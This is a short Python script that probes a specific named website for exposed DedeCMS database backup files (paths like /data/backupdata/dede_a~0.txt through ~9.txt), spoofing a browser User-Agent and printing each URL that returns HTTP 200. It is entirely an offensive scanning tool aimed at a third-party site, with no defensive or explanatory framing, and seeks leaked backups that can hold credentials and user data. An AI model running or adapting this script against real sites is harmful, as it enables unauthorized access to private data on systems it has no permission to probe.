import requests

headers={"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0"}

url='http://www.dgchenglv.com/'

exp='/data/backupdata/dede_a~'

for i in range(10):
    urls= url + exp + str(i) + '.txt'
    res=requests.get(urls,headers=headers,timeout=4)
    # print(urls)
    code=res.status_code
    if code==200:
        print('存在==》' + urls)
